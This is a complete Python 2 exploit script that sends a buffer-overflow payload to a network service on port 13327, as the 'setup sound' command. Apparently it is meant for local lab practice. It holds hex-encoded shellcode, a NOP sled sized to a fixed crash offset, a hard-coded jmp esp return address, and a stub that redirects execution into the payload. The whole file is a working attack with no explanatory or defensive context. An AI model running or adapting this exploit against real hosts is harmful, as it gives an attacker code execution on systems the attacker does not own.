#!/usr/bin/python
import socket

host = "127.0.0.1"

shellcode =  ""
shellcode += "\xba\xcc\x3a\x9b\x8c\xdb\xc9\xd9\x74\x24\xf4\x5f"
shellcode += "\x29\xc9\xb1\x14\x31\x57\x14\x03\x57\x14\x83\xef"
shellcode += "\xfc\x2e\xcf\xaa\x57\x59\xd3\x9e\x24\xf6\x7e\x23"
shellcode += "\x22\x19\xce\x45\xf9\x59\x74\xd4\x53\x31\x89\xe8"
shellcode += "\x42\x9d\xe7\xf8\x35\x4d\x71\x19\xdf\x0b\xd9\x17"
shellcode += "\xa0\x5a\x98\xa3\x12\x58\xab\xca\x99\xe0\x88\xa2"
shellcode += "\x44\x2d\x8e\x50\xd1\xc7\xb0\x0e\x2f\x97\x86\xd7"
shellcode += "\x57\xff\x37\x07\xdb\x97\x2f\x78\x79\x0e\xde\x0f"
shellcode += "\x9e\x80\x4d\x99\x80\x90\x79\x54\xc2"

# Overflow, jump to 0x08134597 (jmp esp), then increment EAX
# by twelve and jump to that
crash = "\x90" * (4368-105) + shellcode + "\x97\x45\x13\x08" + "\x83\xC0\x0C\xFF\xE0\x90\x90"

buffer = "\x11(setup sound " + crash + "\x90\x00#"

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*] Sending buffer..."

sock.connect((host, 13327))
data = sock.recv(1024)
print data
sock.send(buffer)
sock.close()
print "[*] Buffer sent!"
